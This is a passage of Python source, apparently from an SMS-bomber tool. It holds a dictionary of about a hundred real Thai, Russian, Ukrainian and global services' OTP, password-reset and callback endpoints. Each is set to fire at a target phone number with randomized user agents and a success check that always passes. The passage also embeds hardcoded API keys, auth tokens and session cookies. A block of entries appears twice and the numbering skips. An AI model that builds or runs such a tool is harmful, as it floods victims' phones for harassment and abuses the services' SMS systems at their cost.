        "success_check": lambda r: True
    },
    "api72": {
        "name": "Ep789Bet",
        "url": "https://ep789bet.net/auth/send_otp",
        "method": "POST",
        "headers": lambda: {"content-type": "application/x-www-form-urlencoded", "user-agent": ua.random, "origin": "https://ep789bet.net", "referer": "https://ep789bet.net/register", "cookie": "ep789bet=afe1feci916eqoq896js1f8dt93r88ov"},
        "data": lambda p: f"phone={p}&otp=&password=&bank=&bank_number=&full_name=&ref=",
        "success_check": lambda r: True
    },
    "api73": {
        "name": "McShopReset",
        "url": "https://api.mcshop.com/cognito/me/forget-password",
        "method": "POST",
        "headers": lambda: {"x-store-token": "mcshop", "content-type": "application/json;charset=UTF-8", "user-agent": ua.random, "x-auth-token": "O2d1ZXN0OzExNDcwNTg3OzIxODY1ODkyZTMzZGMwMGMzZjNlZmZlNDBlMmY3OTgzOzs7Ow==", "x-api-key": "ZU2QOTDkCV5JYVkWXdYFL8niGXB8l1mq2H2NQof3", "origin": "https://www.mcshop.com", "referer": "https://www.mcshop.com/"},
        "data": lambda p: {"username": f"{p}"},
        "success_check": lambda r: True
    },
    "api74": {
        "name": "Msport1688",
        "url": "https://www.msport1688.com/auth/otp_sender",
        "method": "POST",
        "headers": lambda: {"content-type": "application/x-www-form-urlencoded", "user-agent": ua.random, "origin": "https://www.msport1688.com", "referer": "https://www.msport1688.com/ register?broker_ref_code=master", "cookie": "msp_ss_client=upt6ij2sckk5p8vejmmrnauiaucalmkd"},
        "data": lambda p: f"phone={p}&otp=&password=&bank=&bank_number=&full_name=&ref=",
        "success_check": lambda r: True
    },
    "api75": {
        "name": "LotussClub",
        "url": "https://api-customer.lotuss.com/clubcard-bff/v1/customers/otp",
        "method": "POST",
        "headers": lambda: {"User-Agent": ua.random},
        "data": lambda p: {"mobile_phone_no": p},
        "success_check": lambda r: True
    },
    "api76": {
        "name": "Watsons",
        "url": "https://api.watsons.co.th/api/v2/wtcth/forms/extendedActivateMemberCardForm/steps/wtcth_extendedActivateMemberCardForm_step1/validateAndPrepareNextStep?fields=ASIA_DEFAULT&lang=th&curr=THB",
        "method": "POST",
        "headers": lambda: {"content-type": "application/json", "user-agent": ua.random, "origin": "https://www.watsons.co.th", "referer": "https://www.watsons.co.th/"},
        "data": lambda p: {"otpTokenRequest": {"action": "ACTIVATE_MEMBER_CARD", "type": "SMS", "countryCode": "66", "target": f"{p}"}, "defaultAddress": {"mobileNumberCountryCode": "66", "mobileNumber": f"{p}"}, "mobileNumber": f"{p}"},
        "success_check": lambda r: True
    },
    "api77": {
        "name": "EventPass",
        "url": "https://services.eventpass.co/eventpass-accounts/otp/send",
        "method": "POST",
        "headers": lambda: {"content-type": "application/json", "user-agent": ua.random, "appid": "EVPAPP601129510b8d9205016493a3", "origin": "https://www.eventpass.co", "referer": "https://www.eventpass.co/"},
        "data": lambda p: {"send_to": f"{p}", "send_otp_type": "mobile", "otp_type": "register"},
        "success_check": lambda r: True
    },
    "api78": {
        "name": "AgPlus",
        "url": "https://practical13.hbsapi.com/sms/send-otp",
        "method": "POST",
        "headers": lambda: {"content-type": "application/json;charset=UTF-8", "user-agent": ua.random, "origin": "https://app.agplus.co", "referer": "https://app.agplus.co/"},
        "data": lambda p: {"phone": f"{p}"},
        "success_check": lambda r: True
    },
    "api79": {
        "name": "MtsBlockchain",
        "url": "https://www.mtsblockchain.com/mgb-api/user/register/reqotp",
        "method": "POST",
        "headers": lambda: {"Content-Type": "application/json", "User-Agent": ua.random, "Origin": "https://www.mtsblockchain.com", "Referer": "https://www.mtsblockchain.com/register"},
        "data": lambda p: {"mobile": f"{p}"},
        "success_check": lambda r: True
    },
    "api80": {
        "name": "Khonde",
        "url": "https://app.khonde.com/requestOTP/{phone}",
        "method": "GET",
        "headers": lambda: {"User-Agent": ua.random},
        "data": None,
        "success_check": lambda r: True
    },
    "api81": {
        "name": "SaleHere",
        "url": "https://api.salehere.co.th/graphql",
        "method": "POST",
        "headers": lambda: {"content-type": "application/json", "user-agent": ua.random, "origin": "https://salehere.co.th", "referer": "https://salehere.co.th/"},
        "data": lambda p: {"operationName": "sendUserOTPV2", "variables": {"tel": f"{p}", "token": ""}, "extensions": {"persistedQuery": {"version": 1, "sha256Hash": "acecc9495b3613d3f076c1588fc5c2fd6fc90dad9a7eaa65f3cef86da88fe68d"}}},
        "success_check": lambda r: True
    },
    "api82": {
        "name": "BestInc",
        "url": "https://api.best-inc.co.th/account/sendlogincode",
        "method": "POST",
        "headers": lambda: {"content-type": "application/x-www-form-urlencoded", "User-Agent": ua.random, "Origin": "https://www.best-inc.co.th", "Referer": "https://www.best-inc.co.th/"},
        "data": lambda p: f"phoneNumber=%22{p}%22",
        "success_check": lambda r: True
    },
    "api83": {
        "name": "McShopOTP",
        "url": "https://api.mcshop.com/cognito/otp",
        "method": "POST",
        "headers": lambda: {"x-store-token": "mcshop", "content-type": "application/json;charset=UTF-8", "user-agent": ua.random, "x-auth-token": "O2d1ZXN0OzExNDcwNTg3OzIxODY1ODkyZTMzZGMwMGMzZjNlZmZlNDBlMmY3OTgzOzs7Ow==", "x-api-key": "ZU2QOTDkCV5JYVkWXdYFL8niGXB8l1mq2H2NQof3", "origin": "https://www.mcshop.com", "referer": "https://www.mcshop.com/"},
        "data": lambda p: {"username": f"{p}", "language": "th"},
        "success_check": lambda r: True
    },
    "api84": {
        "name": "ICQ",
        "url": "https://u.icq.net/api/v4/rapi",
        "method": "POST",
        "headers": lambda: {"content-type": "application/json", "user-agent": ua.random},
        "data": lambda p: {"method": "auth/sendCode", "reqId": "24973-1587490090", "params": {"phone": f"66{p[1:]}", "language": "en-US", "route": "sms", "devId": "ic1rtwz1s1Hj1O0r", "application": "icq"}},
        "success_check": lambda r: True
    },
    "api85": {
        "name": "HDMallResend",
        "url": "https://hdmall.co.th/phone_verifications?mobile={phone}&resend=true",
        "method": "POST",
        "headers": lambda: {"User-Agent": ua.random},
        "data": None,
        "success_check": lambda r: True
    },
    "api86": {
        "name": "JobBKK",
        "url": "https://api.jobbkk.com/v1/easy/otp_code",
        "method": "POST",
        "headers": lambda: {"user-agent": ua.random, 'content-type': 'application/x-www-form-urlencoded; charset=UTF-8'},
        "data": lambda p: "mobile=" + p,
        "success_check": lambda r: True
    },
    "api87": {
        "name": "Droprich",
        "url": "https://app.droprich.co/agent/registergetsmsotp",
        "method": "POST",
        "headers": lambda: {"Content-Type": "application/x-www-form-urlencoded; charset=UTF-8", "user-agent": ua.random},
        "data": lambda p: f"phonenumber={p}",
        "success_check": lambda r: True
    },
    "api88": {
        "name": "Firster",
        "url": "https://graph.firster.com/graphql",
        "method": "POST",
        "headers": lambda: {"User-Agent": ua.random, "organizationcode": "lifestyle", "content-type": "application/json"},
        "data": lambda p: {"operationName": "sendOtp", "variables": {"input": {"mobileNumber": p[1:], "phoneCode": "THA-66"}}, "query": "mutation sendOtp($input: SendOTPInput!) {\n  sendOTPRegister(input: $input) {\n    token\n    otpReference\n    expirationOn\n    __typename\n  }\n}\n"},
        "success_check": lambda r: True
    },
    "api89": {
        "name": "UfaAutoBet",
        "url": "https://aws-autobet168.api-ufa.com/transfer/f/user/request-otp",
        "method": "POST",
        "headers": lambda: {"content-type": "application/json", "user-agent": ua.random, "origin": "https://mob-wallet.autoeasy.io", "referer": "https://mob-wallet.autoeasy.io/"},
        "data": lambda p: {"phoneNumber": f"{p}", "prefix": "F2R41"},
        "success_check": lambda r: True
    },
    "api90": {
        "name": "Giztix",
        "url": "https://api.giztix.com/graphql",
        "method": "POST",
        "headers": lambda: {"content-type": "application/json", "authorization": "null", "user-agent": ua.random, "origin": "https://app.giztix.com", "referer": "https://app.giztix.com/"},
        "data": lambda p: {"operationName": "OtpGeneratePhone", "variables": {"phone": f"66{p}"}, "query": "mutation OtpGeneratePhone($phone: ID!) {\n  otpGeneratePhone(phone: $phone) {\n    ref\n    __typename\n  }\n}\n"},
        "success_check": lambda r: True
    },
    "api91": {
        "name": "SboBet",
        "url": "https://api.sbobet.one/api/RegisterService/RequestOTP",
        "method": "POST",
        "headers": lambda: {"content-type": "application/json", "user-agent": ua.random, "origin": "https://app.sbobet.one", "referer": "https://app.sbobet.one/"},
        "data": lambda p: {"Phone": f"{p}"},
        "success_check": lambda r: True
    },
    "api92": {
        "name": "NTBooster",
        "url": "https://covid19vaccine.ntplc.co.th/ntboosterapi/user/getOTP?telNumber={phone}",
        "method": "GET",
        "headers": lambda: {"User-Agent": ua.random},
        "data": None,
        "success_check": lambda r: True
    },
    "api93": {
        "name": "iShip",
        "url": "https://app.iship.cloud/api/ant/request-otp/{phone}",
        "method": "GET",
        "headers": lambda: {"User-Agent": ua.random},
        "data": None,
        "success_check": lambda r: True
    },
    "api94": {
        "name": "PgZeed",
        "url": "https://pgzeed.org/api/otp",
        "method": "POST",
        "headers": lambda: {"content-type": "application/json", "user-agent": ua.random, "origin": "https://pgzeed.org", "referer": "https://pgzeed.org/?campGame=SLOT&s_=59"},
        "data": lambda p: {"phone_number": f"{p}", "register_type": ""},
        "success_check": lambda r: True
    },
    "api95": {
        "name": "HuayNaka",
        "url": "https://referral.huaynaka.com/v1/sendotp",
        "method": "POST",
        "headers": lambda: {"content-type": "application/json;charset=UTF-8", "user-agent": ua.random, "x-api-key": "Prmx2j2mZaaKwCR4jDyki9VANcKqF3565owwHgDE", "origin": "https://tang.huaynaka.com", "referer": "https://tang.huaynaka.com/"},
        "data": lambda p: {"phone": f"+66{p}"},
        "success_check": lambda r: True
    },
    "api96": {
        "name": "Zuma789",
        "url": "https://zuma789-backend.uwallet.link/api/otp/send",
        "method": "POST",
        "headers": lambda: {"content-type": "application/json;charset=UTF-8", "x-requested-with": "wallet-user", "user-agent": ua.random, "origin": "https://zuma789.uwallet.link", "referer": "https://zuma789.uwallet.link/"},
        "data": lambda p: {"phoneNumber": f"{p}"},
        "success_check": lambda r: True
    },
    "api97": {
        "name": "SabuyEBuy",
        "url": "https://www.sabuyebuy.com/wp-json/api/v2/send-x",
        "method": "POST",
        "headers": lambda: {"user-agent": ua.random, "content-type": "application/json"},
        "data": lambda p: {"first_name": "askdhajshd", "last_name": "jhasjdhasjd", "address": "", "birthday": "", "phone": f"{p}", "commissions_id": "", "email_address": "aasdhas@Jhasd.asd", "password": "as257400", "agreements": "true", "uuid": "3f202dcd-8093-4ff9-a263-07ff7e9bd282", "affiliate_id": "1"},
        "success_check": lambda r: True
    },
    "api98": {
        "name": "Cdfoi9",
        "url": "https://api.cdfoi9.com/api/v1/index.php",
        "method": "POST",
        "headers": lambda: {"user-agent": ua.random, "content-type": "application/x-www-form-urlencoded"},
        "data": lambda p: f"module=%2Fusers%2FgetVerificationCode&mobile={p}&merchantId=111&domainId=0&accessId=&accessToken=&walletIsAdmin=",
        "success_check": lambda r: True
    },
    "api99": {
        "name": "BkkApi",
        "url": "https://bkk-api.ks-it.co/Vcode/register?country_code=66&phone={phone}&sms_type=1&user_type=2&app_version=4.3.25&device_id=79722530562d973f&app_device_param=%7B%22os%22%3A%22Android%22%2C%22app_version%22%3A%224.3.25%22%2C%22model%22%3A%22A37f%22%2C%22os_ver%22%3A%225.1.1%22%2C%22ble%22%3A%220%22%7D&language=th&token=",
        "method": "POST",
        "headers": lambda: {"User-Agent": ua.random},
        "data": None,
        "success_check": lambda r: True
    },
    "api100": {
        "name": "MangoSlots",
        "url": "https://api.mango-slots.com/sexyline-ecp/api/v1/sms/sendVerificationCode/register",
        "method": "POST",
        "headers": lambda: {"user-agent": ua.random, "content-type": "application/json;charset=UTF-8"},
        "data": lambda p: {"mobile": f"66 {p}"},
        "success_check": lambda r: True
    },
    "api101": {
        "name": "OpenRice",
        "url": "https://th.openrice.com/api/v1/auth/signup/phone?uiLang=th&uiCity=bangkokr",
        "method": "POST",
        "headers": lambda: {"content-type": "application/x-www-form-urlencoded", "accept": "*/*", "user-agent": ua.random},
        "data": lambda p: f"areaCode=6&phone={p}&regionId=400",
        "success_check": lambda r: True
    },
    "api102": {
        "name": "JokerSlotzz",
        "url": "https://api.jokerslotzz.com/public/request-otp",
        "method": "POST",
        "headers": lambda: {"content-type": "application/json;charset=UTF-8", "user-agent": ua.random, "origin": "https://member.jokerslotzz.com", "referer": "https://member.jokerslotzz.com/"},
        "data": lambda p: {"username": f"{p}"},
        "success_check": lambda r: True
    },
    "api103": {
        "name": "Cars24",
        "url": "https://users.cars24.co.th/oauth/consumer-app/otp/{phone}?gaClientId=1814942739.1666373332&user-type=buyer&lang=th",
        "method": "GET",
        "headers": lambda: {"x_vehicle_type": "CAR", "x_platform": "mSite", "user-agent": ua.random, "x_country": "TH", "origin": "https://www.cars24.co.th"},
        "data": None,
        "success_check": lambda r: True
    },
    "api104": {
        "name": "The1",
        "url": "https://the1web-api.the1.co.th/api/t1p/regis/requestOTP",
        "method": "POST",
        "headers": lambda: {"User-Agent": ua.random},
        "data": lambda p: {"on": {"value": p, "country": "66"}, "type": "mobile"},
        "success_check": lambda r: True
    },
    "api105": {
        "name": "AISPlay",
        "url": "https://srfng.ais.co.th/login/sendOneTimePW",
        "method": "POST",
        "headers": lambda: {"User-Agent": ua.random, "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8"},
        "data": lambda p: f"msisdn=66{p[1:]}&serviceId=AISPlay&accountType=all&otpChannel=sms",
        # Note: AIS requires a token from GET request first, this might fail without it
        "success_check": lambda r: True
    },
    "api106": {
        "name": "ThaiSME",
        "url": "https://api.thaisme.one/smegp/register/request-otp",
        "method": "POST",
        "headers": lambda: {"User-Agent": ua.random},
        "data": lambda p: {"MOBILE": p},
        "success_check": lambda r: True
    },
    "api107": {
        "name": "Fairdee",
        "url": "https://api.fairdee.co.th/profile/request-otp",
        "method": "POST",
        "headers": lambda: {"User-Agent": ua.random},
        "data": lambda p: {"username": f"{p}", "username_type": "phone", "intent": "signup"},
        "success_check": lambda r: True
    },
    "api108": {
        "name": "OnePlayBet",
        "url": "https://api-member.oneplaybet.com/user/register/otp",
        "method": "POST",
        "headers": lambda: {"user-agent": ua.random},
        "data": lambda p: {"mobileNumber": f"{p}", "partnerKey": "XPB289TOP113"},
        "success_check": lambda r: True
    },
    "api109": {
        "name": "MonkeyEveryday",
        "url": "https://api.monkeyeveryday.com/graphql",
        "method": "POST",
        "headers": lambda: {"user-agent": ua.random, "content-type": "application/json"},
        "data": lambda p: {"operationName": "requestRegistrationOtp", "variables": {p}, "query": "mutation requestRegistrationOtp($phone: String!) {\n  requestRegistrationOtp(phone: $phone) {\n    token\n    typename\n  }\n}\n"},
        "success_check": lambda r: True
    },
    "api110": {
        "name": "YellowTire",
        "url": "https://api.yellowtire.com/api/user/request-otp",
        "method": "POST",
        "headers": lambda: {"Content-Type": "application/json", "User-Agent": ua.random},
        "data": lambda p: {"tel": f"{p}"},
        "success_check": lambda r: True
    },
    "api111": {
        "name": "Swopmart",
        "url": "https://api.swopmart.co.th/graphql",
        "method": "POST",
        "headers": lambda: {"user-agent": ua.random, "authorization": "Bearer undefined"},
        "data": lambda p: {"operationName": "requestOtpPhoneNumber", "variables": {"phoneNumber": f"{p}"}, "query": "mutation requestOtpPhoneNumber($phoneNumber: String!) {\n  requestOtpPhoneNumber(phoneNumber: $phoneNumber)\n}"},
        "success_check": lambda r: True
    },
    "api112": {
        "name": "BigC",
        "url": "https://openapi.bigc.co.th/customer/v1/otp",
        "method": "POST",
        "headers": lambda: {"user-agent": ua.random, "content-type": "application/json"},
        "data": lambda p: {"phone_no": p},
        "success_check": lambda r: True
    },
    "api113": {
        "name": "1Ufa",
        "url": "https://1ufa.bet/_ajax_/request-otp",
        "method": "POST",
        "headers": lambda: {"user-agent": ua.random, "Content-Type": "application/x-www-form-urlencoded", "cookie": "PHPSESSID=0j2uoh0oesv4ngaopas52ug8gk"},
        "data": lambda p: {"request_otp[phoneNumber]": f"{p}", "request_otp[termAndCondition]": "1", "request_otp[_token]": "U5doBrJJ5u91294kDU40Z_KrdPLTcfNQ5J3MhDsyg8M"},
        "success_check": lambda r: True
    },
    "api114": {
        "name": "Zoloto585",
        "url": "https://zoloto585.ru/api/bcard/reg/",
        "method": "POST",
        "headers": lambda: get_common_headers("https://zoloto585.ru/", "https://zoloto585.ru"),
        "data": lambda p: {"name": "", "surname": "", "patronymic": "", "sex": "m", "birthdate": "..", "phone": p, "email": "", "city": ""},
        "success_check": lambda r: True
    },
    "api115": {
        "name": "Youla",
        "url": "https://youla.ru/web-api/auth/request_code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://youla.ru/", "https://youla.ru"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api116": {
        "name": "Yaponchik",
        "url": "https://yaponchik.net/login/login.php",
        "method": "POST",
        "headers": lambda: get_common_headers("https://yaponchik.net/", "https://yaponchik.net", "application/x-www-form-urlencoded"),
        "data": lambda p: {"login": "Y", "countdown": "0", "step": "phone", "redirect": "/profile/", "phone": p, "code": ""},
        "success_check": lambda r: True
    },
    "api117": {
        "name": "YandexEda",
        "url": "https://eda.yandex/api/v1/user/request_authentication_code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://eda.yandex/", "https://eda.yandex"),
        "data": lambda p: {"phone_number": f"+{p}"},
        "success_check": lambda r: True
    },
    "api118": {
        "name": "IconJob",
        "url": "https://api.iconjob.co/api/auth/verification_code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://iconjob.co/", "https://iconjob.co"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api119": {
        "name": "WiFiRu",
        "url": "https://cabinet.wi-fi.ru/api/auth/by-sms",
        "method": "POST",
        "headers": lambda: get_common_headers("https://cabinet.wi-fi.ru/", "https://cabinet.wi-fi.ru", "application/x-www-form-urlencoded"),
        "data": lambda p: {"msisdn": p},
        "success_check": lambda r: True
    },
    "api120": {
        "name": "Webbankir",
        "url": "https://ng-api.webbankir.com/user/v2/create",
        "method": "POST",
        "headers": lambda: get_common_headers("https://webbankir.com/", "https://webbankir.com"),
        "data": lambda p: {"lastName": "иванов", "firstName": "иван", "middleName": "иванович", "mobilePhone": p, "email": "test@gmail.com", "smsCode": ""},
        "success_check": lambda r: True
    },
    "api121": {
        "name": "VSK",
        "url": "https://shop.vsk.ru/ajax/auth/postSms/",
        "method": "POST",
        "headers": lambda: get_common_headers("https://shop.vsk.ru/", "https://shop.vsk.ru", "application/x-www-form-urlencoded"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api122": {
        "name": "Twitch",
        "url": "https://passport.twitch.tv/register?trusted_request=true",
        "method": "POST",
        "headers": lambda: get_common_headers("https://twitch.tv/", "https://twitch.tv"),
        "data": lambda p: {"birthday": {"day": 11, "month": 11, "year": 1999}, "client_id": "kd1unb4b3q4t58fwlpcbzcbnm76a8fp", "include_verification_code": True, "password": "Password123", "phone_number": p, "username": "UserTest123"},
        "success_check": lambda r: True
    },
    "api123": {
        "name": "Utair",
        "url": "https://b.utair.ru/api/v1/login/",
        "method": "POST",
        "headers": lambda: get_common_headers("https://utair.ru/", "https://utair.ru"),
        "data": lambda p: {"login": p, "confirmation_type": "call_code"},
        "success_check": lambda r: True
    },
    "api124": {
        "name": "RUlybka",
        "url": "https://www.r-ulybka.ru/login/form_ajax.php",
        "method": "POST",
        "headers": lambda: get_common_headers("https://www.r-ulybka.ru/", "https://www.r-ulybka.ru", "application/x-www-form-urlencoded"),
        "data": lambda p: {"action": "auth", "phone": p},
        "success_check": lambda r: True
    },
    "api125": {
        "name": "Uklon",
        "url": "https://uklon.com.ua/api/v1/account/code/send",
        "method": "POST",
        "headers": lambda: {"client_id": "6289de851fc726f887af8d5d7a56c635", "User-Agent": ua.random, "Content-Type": "application/json"},
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api126": {
        "name": "TopShop",
        "url": "https://www.top-shop.ru/login/loginByPhone/",
        "method": "POST",
        "headers": lambda: get_common_headers("https://www.top-shop.ru/", "https://www.top-shop.ru", "application/x-www-form-urlencoded"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api127": {
        "name": "Tinder",
        "url": "https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru",
        "method": "POST",
        "headers": lambda: get_common_headers("https://tinder.com/", "https://tinder.com", "application/x-www-form-urlencoded"),
        "data": lambda p: {"phone_number": p},
        "success_check": lambda r: True
    },
    "api128": {
        "name": "TheHive",
        "url": "https://thehive.pro/auth/signup",
        "method": "POST",
        "headers": lambda: get_common_headers("https://thehive.pro/", "https://thehive.pro"),
        "data": lambda p: {"phone": f"+{p}"},
        "success_check": lambda r: True
    },
    "api129": {
        "name": "Tele2",
        "url": "https://msk.tele2.ru/api/validation/number/{phone}",
        "method": "POST",
        "headers": lambda: get_common_headers("https://msk.tele2.ru/", "https://msk.tele2.ru"),
        "data": lambda p: {"sender": "Tele2"},
        "success_check": lambda r: True
    },
    "api130": {
        "name": "TaxiRitm",
        "url": "https://www.taxi-ritm.ru/ajax/ppp/ppp_back_call.php",
        "method": "POST",
        "headers": lambda: get_common_headers("https://www.taxi-ritm.ru/", "https://www.taxi-ritm.ru", "application/x-www-form-urlencoded"),
        "data": lambda p: {"RECALL": "Y", "BACK_CALL_PHONE": p},
        "success_check": lambda r: True
    },
    "api131": {
        "name": "TarantinoFamily",
        "url": "https://www.tarantino-family.com/wp-admin/admin-ajax.php",
        "method": "POST",
        "headers": lambda: get_common_headers("https://www.tarantino-family.com/", "https://www.tarantino-family.com", "application/x-www-form-urlencoded"),
        "data": lambda p: {"action": "callback_phonenumber", "phone": p},
        "success_check": lambda r: True
    },
    "api132": {
        "name": "Tabris",
        "url": "https://lk.tabris.ru/reg/",
        "method": "POST",
        "headers": lambda: get_common_headers("https://lk.tabris.ru/", "https://lk.tabris.ru", "application/x-www-form-urlencoded"),
        "data": lambda p: {"action": "phone", "phone": p},
        "success_check": lambda r: True
    },
    "api133": {
        "name": "Tabasko",
        "url": "https://tabasko.su/",
        "method": "POST",
        "headers": lambda: get_common_headers("https://tabasko.su/", "https://tabasko.su", "application/x-www-form-urlencoded"),
        "data": lambda p: {"IS_AJAX": "Y", "COMPONENT_NAME": "AUTH", "ACTION": "GET_CODE", "LOGIN": p},
        "success_check": lambda r: True
    },
    "api114": {
        "name": "Zoloto585",
        "url": "https://zoloto585.ru/api/bcard/reg/",
        "method": "POST",
        "headers": lambda: get_common_headers("https://zoloto585.ru/", "https://zoloto585.ru"),
        "data": lambda p: {"name": "", "surname": "", "patronymic": "", "sex": "m", "birthdate": "..", "phone": p, "email": "", "city": ""},
        "success_check": lambda r: True
    },
    "api115": {
        "name": "Youla",
        "url": "https://youla.ru/web-api/auth/request_code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://youla.ru/", "https://youla.ru"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api116": {
        "name": "Yaponchik",
        "url": "https://yaponchik.net/login/login.php",
        "method": "POST",
        "headers": lambda: get_common_headers("https://yaponchik.net/", "https://yaponchik.net", "application/x-www-form-urlencoded"),
        "data": lambda p: {"login": "Y", "countdown": "0", "step": "phone", "redirect": "/profile/", "phone": p, "code": ""},
        "success_check": lambda r: True
    },
    "api117": {
        "name": "YandexEda",
        "url": "https://eda.yandex/api/v1/user/request_authentication_code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://eda.yandex/", "https://eda.yandex"),
        "data": lambda p: {"phone_number": f"+{p}"},
        "success_check": lambda r: True
    },
    "api118": {
        "name": "IconJob",
        "url": "https://api.iconjob.co/api/auth/verification_code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://iconjob.co/", "https://iconjob.co"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api119": {
        "name": "WiFiRu",
        "url": "https://cabinet.wi-fi.ru/api/auth/by-sms",
        "method": "POST",
        "headers": lambda: get_common_headers("https://cabinet.wi-fi.ru/", "https://cabinet.wi-fi.ru", "application/x-www-form-urlencoded"),
        "data": lambda p: {"msisdn": p},
        "success_check": lambda r: True
    },
    "api120": {
        "name": "Webbankir",
        "url": "https://ng-api.webbankir.com/user/v2/create",
        "method": "POST",
        "headers": lambda: get_common_headers("https://webbankir.com/", "https://webbankir.com"),
        "data": lambda p: {"lastName": "иванов", "firstName": "иван", "middleName": "иванович", "mobilePhone": p, "email": "test@gmail.com", "smsCode": ""},
        "success_check": lambda r: True
    },
    "api121": {
        "name": "VSK",
        "url": "https://shop.vsk.ru/ajax/auth/postSms/",
        "method": "POST",
        "headers": lambda: get_common_headers("https://shop.vsk.ru/", "https://shop.vsk.ru", "application/x-www-form-urlencoded"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api122": {
        "name": "Twitch",
        "url": "https://passport.twitch.tv/register?trusted_request=true",
        "method": "POST",
        "headers": lambda: get_common_headers("https://twitch.tv/", "https://twitch.tv"),
        "data": lambda p: {"birthday": {"day": 11, "month": 11, "year": 1999}, "client_id": "kd1unb4b3q4t58fwlpcbzcbnm76a8fp", "include_verification_code": True, "password": "Password123", "phone_number": p, "username": "UserTest123"},
        "success_check": lambda r: True
    },
    "api123": {
        "name": "Utair",
        "url": "https://b.utair.ru/api/v1/login/",
        "method": "POST",
        "headers": lambda: get_common_headers("https://utair.ru/", "https://utair.ru"),
        "data": lambda p: {"login": p, "confirmation_type": "call_code"},
        "success_check": lambda r: True
    },
    "api124": {
        "name": "RUlybka",
        "url": "https://www.r-ulybka.ru/login/form_ajax.php",
        "method": "POST",
        "headers": lambda: get_common_headers("https://www.r-ulybka.ru/", "https://www.r-ulybka.ru", "application/x-www-form-urlencoded"),
        "data": lambda p: {"action": "auth", "phone": p},
        "success_check": lambda r: True
    },
    "api125": {
        "name": "Uklon",
        "url": "https://uklon.com.ua/api/v1/account/code/send",
        "method": "POST",
        "headers": lambda: {"client_id": "6289de851fc726f887af8d5d7a56c635", "User-Agent": ua.random, "Content-Type": "application/json"},
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api126": {
        "name": "TopShop",
        "url": "https://www.top-shop.ru/login/loginByPhone/",
        "method": "POST",
        "headers": lambda: get_common_headers("https://www.top-shop.ru/", "https://www.top-shop.ru", "application/x-www-form-urlencoded"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api127": {
        "name": "Tinder",
        "url": "https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru",
        "method": "POST",
        "headers": lambda: get_common_headers("https://tinder.com/", "https://tinder.com", "application/x-www-form-urlencoded"),
        "data": lambda p: {"phone_number": p},
        "success_check": lambda r: True
    },
    "api128": {
        "name": "TheHive",
        "url": "https://thehive.pro/auth/signup",
        "method": "POST",
        "headers": lambda: get_common_headers("https://thehive.pro/", "https://thehive.pro"),
        "data": lambda p: {"phone": f"+{p}"},
        "success_check": lambda r: True
    },
    "api129": {
        "name": "Tele2",
        "url": "https://msk.tele2.ru/api/validation/number/{phone}",
        "method": "POST",
        "headers": lambda: get_common_headers("https://msk.tele2.ru/", "https://msk.tele2.ru"),
        "data": lambda p: {"sender": "Tele2"},
        "success_check": lambda r: True
    },
    "api130": {
        "name": "TaxiRitm",
        "url": "https://www.taxi-ritm.ru/ajax/ppp/ppp_back_call.php",
        "method": "POST",
        "headers": lambda: get_common_headers("https://www.taxi-ritm.ru/", "https://www.taxi-ritm.ru", "application/x-www-form-urlencoded"),
        "data": lambda p: {"RECALL": "Y", "BACK_CALL_PHONE": p},
        "success_check": lambda r: True
    },
    "api131": {
        "name": "TarantinoFamily",
        "url": "https://www.tarantino-family.com/wp-admin/admin-ajax.php",
        "method": "POST",
        "headers": lambda: get_common_headers("https://www.tarantino-family.com/", "https://www.tarantino-family.com", "application/x-www-form-urlencoded"),
        "data": lambda p: {"action": "callback_phonenumber", "phone": p},
        "success_check": lambda r: True
    },
    "api132": {
        "name": "Tabris",
        "url": "https://lk.tabris.ru/reg/",
        "method": "POST",
        "headers": lambda: get_common_headers("https://lk.tabris.ru/", "https://lk.tabris.ru", "application/x-www-form-urlencoded"),
        "data": lambda p: {"action": "phone", "phone": p},
        "success_check": lambda r: True
    },
    "api133": {
        "name": "Tabasko",
        "url": "https://tabasko.su/",
        "method": "POST",
        "headers": lambda: get_common_headers("https://tabasko.su/", "https://tabasko.su", "application/x-www-form-urlencoded"),
        "data": lambda p: {"IS_AJAX": "Y", "COMPONENT_NAME": "AUTH", "ACTION": "GET_CODE", "LOGIN": p},
        "success_check": lambda r: True
    },
    "api166": {
        "name": "Modulbank",
        "url": "https://my.modulbank.ru/api/v2/registration/nameAndPhone",
        "method": "POST",
        "headers": lambda: get_common_headers("https://modulbank.ru/", "https://modulbank.ru"),
        "data": lambda p: {"FirstName": "Test", "CellPhone": p, "Package": "optimal"},
        "success_check": lambda r: True
    },
    "api167": {
        "name": "MobilePlanet",
        "url": "https://mobileplanet.ua/register",
        "method": "POST",
        "headers": lambda: get_common_headers("https://mobileplanet.ua/", "https://mobileplanet.ua", "application/x-www-form-urlencoded"),
        "data": lambda p: {"klient_name": "Test", "klient_phone": f"+{p}", "klient_email": "test@gmail.com"},
        "success_check": lambda r: True
    },
    "api168": {
        "name": "MisterCash",
        "url": "https://my.mistercash.ua/ru/send/sms/registration?number=+{phone}",
        "method": "GET",
        "headers": lambda: get_common_headers("https://mistercash.ua/", "https://mistercash.ua"),
        "data": None,
        "success_check": lambda r: True
    },
    "api169": {
        "name": "MenzaCafe",
        "url": "https://menza-cafe.ru/system/call_me.php?fio=Test&phone={phone}&phone_number=1",
        "method": "GET",
        "headers": lambda: get_common_headers("https://menza-cafe.ru/", "https://menza-cafe.ru"),
        "data": None,
        "success_check": lambda r: True
    },
    "api170": {
        "name": "MenuUA",
        "url": "https://www.menu.ua/kiev/delivery/registration/direct-registration.html",
        "method": "POST",
